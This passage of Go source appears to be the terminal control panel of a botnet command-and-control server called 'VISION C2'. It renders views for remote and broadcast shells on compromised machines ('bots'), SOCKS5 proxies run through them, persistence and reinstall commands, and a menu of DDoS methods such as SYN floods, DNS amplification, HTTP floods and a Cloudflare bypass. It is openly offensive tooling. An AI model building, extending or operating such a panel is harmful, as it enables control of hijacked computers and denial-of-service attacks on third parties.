				statusStyled = neonRed.Render("○ STOPPED")
				portDisplay = dim.Render(item.port)
			default:
				statusStyled = dim.Render("- NONE")
				portDisplay = dim.Render("-")
			}

			line := fmt.Sprintf("%-18s %-16s %-10s ",
				truncate(item.botID, 16),
				maskIP(item.botIP),
				item.botArch,
			)
			b.WriteString(fmt.Sprintf("%s%s", cursor, style.Render(line)))
			b.WriteString(fmt.Sprintf("%-8s ", portDisplay))
			b.WriteString(statusStyled)
			b.WriteString("\n")
		}

		if len(items) > 10 {
			b.WriteString(dim.Render(fmt.Sprintf("  ... and %d more", len(items)-10)))
			b.WriteString("\n")
		}
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input mode or normal mode
	if m.socksInputMode {
		b.WriteString(neonPink.Bold(true).Render("  START SOCKS5 PROXY"))
		b.WriteString("\n")
		if m.socksCursor < len(items) {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				dim.Render("Bot:"),
				neonCyan.Render(items[m.socksCursor].botID)))
		}
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
		b.WriteString(fmt.Sprintf("  %s %s%s\n",
			neonCyan.Render("▸ Port:"),
			neonGreen.Render(m.socksNewPort),
			cursor))
		b.WriteString("\n")
		b.WriteString(dim.Render("  [enter] Start Socks   [esc] Cancel"))
		b.WriteString("\n")
	} else {
		// Hotkey help
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(fmt.Sprintf("  %s Start Socks   %s Stop Socks   %s/%s View   %s Refresh   %s Back\n",
			hotkey.Render("[s]"),
			hotkey.Render("[x]"),
			hotkey.Render("[←]"),
			hotkey.Render("[→]"),
			hotkey.Render("[r]"),
			hotkey.Render("[q]")))
	}

	return b.String()
}

func (m TUIModel) viewRemoteShell() string {
	var b strings.Builder

	// Header with bot info
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))

	b.WriteString(headerStyle.Render("  💻 REMOTE SHELL"))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s %s %s %s\n",
		dim.Render("Bot:"),
		neonCyan.Render(truncate(m.selectedBot, 20)),
		dim.Render("│ Arch:"),
		neonYellow.Render(m.selectedBotArch)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	// Output area (scrollable)
	outputHeight := 15
	startIdx := 0
	if len(m.shellOutput) > outputHeight {
		startIdx = len(m.shellOutput) - outputHeight
	}

	for i := startIdx; i < len(m.shellOutput); i++ {
		b.WriteString("  " + m.shellOutput[i] + "\n")
	}

	// Pad if less output
	for i := len(m.shellOutput); i < outputHeight; i++ {
		b.WriteString("\n")
	}

	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input prompt or confirmation prompt
	if m.confirmKill {
		// Show kill confirmation
		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
		b.WriteString(warnStyle.Render("  ⚠️  KILL BOT? This will remove the bot permanently!"))
		b.WriteString("\n")
		b.WriteString(fmt.Sprintf("  %s Yes  %s No\n",
			lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("[y]"),
			lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("[n]")))
	} else {
		prompt := neonGreen.Render("  $ ")
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
		b.WriteString(prompt + m.shellInput + cursor)
		b.WriteString("\n\n")

		// Hotkey help
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [ctrl+f] Clear  [esc] Menu\n"))
		b.WriteString(fmt.Sprintf("  %s !persist  %s !reinstall  %s !kill\n",
			hotkey.Render("[ctrl+p]"),
			hotkey.Render("[ctrl+r]"),
			hotkey.Render("[ctrl+x]")))
	}

	return b.String()
}

func (m TUIModel) viewBroadcastShell() string {
	var b strings.Builder

	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))

	b.WriteString(headerStyle.Render("  📡 BROADCAST SHELL"))
	b.WriteString("\n")

	// Targeting info - aligned layout
	archDisplay := "ALL"
	if m.broadcastArch != "" {
		archDisplay = m.broadcastArch
	}
	ramDisplay := "ANY"
	if m.broadcastMinRAM > 0 {
		ramDisplay = fmt.Sprintf("≥%dMB", m.broadcastMinRAM)
	}
	countDisplay := "ALL"
	if m.broadcastMaxBots > 0 {
		countDisplay = fmt.Sprintf("≤%d", m.broadcastMaxBots)
	}

	b.WriteString(fmt.Sprintf("  %-6s %-10s │ %-6s %-10s │ %-5s %-8s │ %-5s %-6s\n",
		dim.Render("Mode:"), neonPink.Render("DETACHED"),
		dim.Render("Arch:"), neonCyan.Render(fmt.Sprintf("%-8s", archDisplay)),
		dim.Render("RAM:"), neonYellow.Render(fmt.Sprintf("%-6s", ramDisplay)),
		dim.Render("Max:"), neonYellow.Render(countDisplay)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	// Output area
	outputHeight := 12
	startIdx := 0
	if len(m.shellOutput) > outputHeight {
		startIdx = len(m.shellOutput) - outputHeight
	}

	for i := startIdx; i < len(m.shellOutput); i++ {
		b.WriteString("  " + m.shellOutput[i] + "\n")
	}

	for i := len(m.shellOutput); i < outputHeight; i++ {
		b.WriteString("\n")
	}

	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input prompt or confirmation prompt
	if m.confirmPersist {
		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
		b.WriteString(warnStyle.Render("  ⚠️  BROADCAST !persist to ALL matching bots?"))
		b.WriteString("\n")
		b.WriteString(fmt.Sprintf("  %s Yes, install persistence   %s No, cancel\n",
			neonGreen.Render("[y]"),
			neonRed.Render("[n]")))
	} else if m.confirmReinstall {
		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
		b.WriteString(warnStyle.Render("  ⚠️  BROADCAST !reinstall to ALL matching bots?"))
		b.WriteString("\n")
		b.WriteString(fmt.Sprintf("  %s Yes, reinstall bots   %s No, cancel\n",
			neonGreen.Render("[y]"),
			neonRed.Render("[n]")))
	} else {
		prompt := neonPink.Render("  » ")
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Render("█")
		b.WriteString(prompt + m.shellInput + cursor)
		b.WriteString("\n\n")

		// Hotkey help - aligned
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(dim.Render("  [enter] Broadcast   [↑/↓] History   [ctrl+f] Clear   [esc] Menu\n"))
		b.WriteString(fmt.Sprintf("  %s !persist    %s !reinstall\n",
			hotkey.Render("[ctrl+p]"),
			hotkey.Render("[ctrl+r]")))
		b.WriteString(fmt.Sprintf("  %s Arch   %s RAM   %s Max Bots\n",
			hotkey.Render("[ctrl+a]"),
			hotkey.Render("[ctrl+g]"),
			hotkey.Render("[ctrl+n]")))
	}

	return b.String()
}

func (m TUIModel) viewHelp() string {
	var b strings.Builder

	// Styles
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  ❓ HELP & DOCUMENTATION"))
	b.WriteString("\n\n")

	// Section tabs
	sections := []string{"Navigation", "Attacks", "Bot Mgmt", "Shell", "Developer"}
	for i, sec := range sections {
		if i == m.helpSection {
			b.WriteString(neonCyan.Bold(true).Render(" [" + sec + "] "))
		} else {
			b.WriteString(dim.Render("  " + sec + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 60)))
	b.WriteString("\n\n")

	switch m.helpSection {
	case 0: // Navigation
		b.WriteString(neonPink.Bold(true).Render("  ⌨️  NAVIGATION CONTROLS"))
		b.WriteString("\n\n")

		keys := []struct{ key, desc string }{
			{"↑ / k", "Move cursor up"},
			{"↓ / j", "Move cursor down"},
			{"← / h", "Previous section (in help)"},
			{"→ / l", "Next section (in help)"},
			{"enter", "Select / Confirm action"},
			{"tab", "Cycle through views"},
			{"1-4", "Jump directly to view"},
			{"q", "Back / Quit"},
			{"r", "Refresh data"},
			{"esc", "Return to main menu"},
		}

		for _, k := range keys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

	case 1: // Attacks
		b.WriteString(neonRed.Bold(true).Render("  ⚡ ATTACK METHODS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  LAYER 4 (Network)") + "\n")
		l4attacks := []struct{ name, cmd, desc string }{
			{"UDP Flood", "!udpflood", "High-volume UDP packets"},
			{"TCP Flood", "!tcpflood", "TCP connection exhaustion"},
			{"SYN Flood", "!syn", "Raw SYN packet flood"},
			{"ACK Flood", "!ack", "ACK packet flood"},
			{"GRE Flood", "!gre", "GRE tunnel flood"},
			{"DNS Amp", "!dns", "DNS amplification"},
		}
		for _, a := range l4attacks {
			b.WriteString(fmt.Sprintf("  %s %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-10s", a.name)),
				neonGreen.Render(fmt.Sprintf("%-12s", a.cmd)),
				dim.Render(a.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  LAYER 7 (Application)") + "\n")
		l7attacks := []struct{ name, cmd, desc string }{
			{"HTTP GET", "!http", "HTTP GET request flood"},
			{"HTTPS/TLS", "!https", "Encrypted HTTPS flood"},
			{"CF Bypass", "!cfbypass", "Cloudflare UAM bypass"},
		}
		for _, a := range l7attacks {
			b.WriteString(fmt.Sprintf("  %s %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-10s", a.name)),
				neonGreen.Render(fmt.Sprintf("%-12s", a.cmd)),
				dim.Render(a.desc)))
		}

	case 2: // Bot Management
		b.WriteString(neonGreen.Bold(true).Render("  🤖 BOT MANAGEMENT"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Bot List View") + "\n")
		b.WriteString(white.Render("  • View all connected bots with stats") + "\n")
		b.WriteString(white.Render("  • See architecture, IP, RAM, uptime") + "\n")
		b.WriteString(white.Render("  • Press ") + neonYellow.Render("enter") + white.Render(" to open remote shell") + "\n")
		b.WriteString(white.Render("  • Press ") + neonYellow.Render("r") + white.Render(" to refresh bot list") + "\n\n")

		b.WriteString(neonOrange.Render("  Bot Commands") + "\n")
		cmds := []struct{ cmd, desc string }{
			{"!persist", "Install persistence on bot"},
			{"!reinstall", "Reinstall bot binary"},
			{"!lolnogtfo", "Kill/remove bot permanently"},
			{"!shell <cmd>", "Execute shell command"},
			{"!exec <cmd>", "Execute without output"},
		}
		for _, c := range cmds {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-14s", c.cmd)),
				dim.Render(c.desc)))
		}

	case 3: // Shell
		b.WriteString(neonCyan.Bold(true).Render("  💻 SHELL CONTROLS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Remote Shell (Single Bot)") + "\n")
		shellKeys := []struct{ key, desc string }{
			{"ctrl+p", "Send !persist command"},
			{"ctrl+r", "Send !reinstall command"},
			{"ctrl+x", "Kill bot (with confirmation)"},
			{"ctrl+f", "Clear shell output"},
			{"↑ / ↓", "Navigate command history"},
			{"esc", "Return to main menu"},
		}
		for _, k := range shellKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Broadcast Shell (All Bots)") + "\n")
		broadcastKeys := []struct{ key, desc string }{
			{"ctrl+p", "Broadcast !persist (with confirm)"},
			{"ctrl+r", "Broadcast !reinstall (with confirm)"},
			{"ctrl+a", "Cycle architecture filter"},
			{"ctrl+g", "Cycle minimum RAM filter"},
			{"ctrl+n", "Cycle max bots filter"},
		}
		for _, k := range broadcastKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

	case 4: // Developer
		b.WriteString(neonPink.Bold(true).Render("  👁️  DEVELOPER INFO"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Project") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Name:"), neonCyan.Bold(true).Render("VISION C2")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Version:"), white.Render("V1.7")))
		b.WriteString("\n" + neonOrange.Render("  Credits") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Developer"), neonPink.Render(" Syn ")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Mail:"), white.Render("dev@sinners.city")))
		b.WriteString("\n")
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 60)))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s Prev Section  %s Next Section  %s Back\n",
		neonYellow.Render("[←]"),
		neonYellow.Render("[→]"),
		neonYellow.Render("[q]")))

	return b.String()
}

func (m TUIModel) renderStatusBar() string {
	// Check if toast has expired
	toast := ""
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		toast = m.toastMessage
	}

	width := m.width
	if width == 0 {
		width = 120
	}

	// Style definitions for status bar elements
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Bold(true)
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Bold(true)
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	dimStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
	whiteStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("252"))

	// Get C2 uptime
	uptime := getC2Uptime()

	// Get architecture distribution
	archMap := getArchMap()
	archParts := []string{}
	for arch, count := range archMap {
		archParts = append(archParts, fmt.Sprintf("%s:%d", arch, count))
	}
	archStr := "none"
	if len(archParts) > 0 {
		archStr = strings.Join(archParts, " ")
	}

	// View names mapping
	viewNames := []string{"Dashboard", "Bots", "Attack", "Methods", "Settings", "Help", "Shell", "Broadcast"}
	viewIdx := int(m.currentView)
	if viewIdx >= len(viewNames) {
		viewIdx = 0
	}

	// Build single status bar with all info
	leftSection := fmt.Sprintf(" %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
		neonPink.Render("☾℣☽"),
		neonCyan.Render("VISION"),
		dimStyle.Render("│"),
		neonGreen.Render("●"),
		whiteStyle.Render("ONLINE"),
		dimStyle.Render("│"),
		neonYellow.Render("⚡"),
		whiteStyle.Render(fmt.Sprintf("%d", m.botCount)),
		dimStyle.Render("│"),
		whiteStyle.Render(formatRAM(m.totalRAM)),
		dimStyle.Render("│"),
		neonCyan.Render("⏱"),
		whiteStyle.Render(uptime),
		dimStyle.Render("│"))

	archSection := fmt.Sprintf("%s", neonCyan.Render(archStr))

	rightSection := fmt.Sprintf("%s %s ",
		dimStyle.Render("│"),
		neonPink.Render(viewNames[viewIdx]))

	// Calculate raw lengths for padding (strip ANSI codes)
	rawLeft := fmt.Sprintf(" ☾℣☽ VISION │ ● ONLINE │ ⚡ %d │ %s │ ⏱ %s │ %s",
		m.botCount, formatRAM(m.totalRAM), uptime, archStr)
	rawRight := fmt.Sprintf("│ %s ", viewNames[viewIdx])

	padding := width - len(rawLeft) - len(rawRight)
	if padding < 0 {
		padding = 0
	}

	bar := leftSection + archSection + strings.Repeat(" ", padding) + rightSection

	// Render single status bar
	statusBar := lipgloss.NewStyle().
		Background(lipgloss.Color("236")).
		Width(width).
		Render(bar)

	// Add toast below status bar if active
	if toast != "" {
		toastBar := lipgloss.NewStyle().
			Background(lipgloss.Color("234")).
			Width(width).
			Padding(0, 1).
			Render(toast)
		return statusBar + "\n" + toastBar
	}

	return statusBar
}

// NewTUIModel creates a new TUI model with default values
func NewTUIModel() TUIModel {
	return TUIModel{
		currentView: ViewDashboard,
		menuItems: []string{
			"BOT MANAGEMENT",
			"ATTACK CENTER",
			"BROADCAST SHELL",
			"SOCKS MANAGER",
			"HELP & INFO",
			"EXIT",
		},
		menuCursor:     0,
		status:         "ONLINE",
		attackMethod:   "",
		attackCmd:      "",
		attackDuration: "60",
		attackPort:     "80",
		methodCursor:   0,
		shellOutput:    []string{},
		shellHistory:   []string{},
	}
}

// Global TUI program for external updates
var tuiProgram *tea.Program

// StartTUI starts the Bubble Tea TUI (for local console mode)
func StartTUI() error {
	m := NewTUIModel()
	m.botCount = getBotCount()
	m.totalRAM = getTotalRAM()
	m.totalCPU = getTotalCPU()

	p := tea.NewProgram(m, tea.WithAltScreen())
	tuiProgram = p
	_, err := p.Run()
	return err
}

// LogBotConnection adds a connection event to the TUI log
func LogBotConnection(arch string, connected bool) {
	if tuiProgram != nil {
		tuiProgram.Send(ConnLogMsg{Arch: arch, Connected: connected})
	}
}
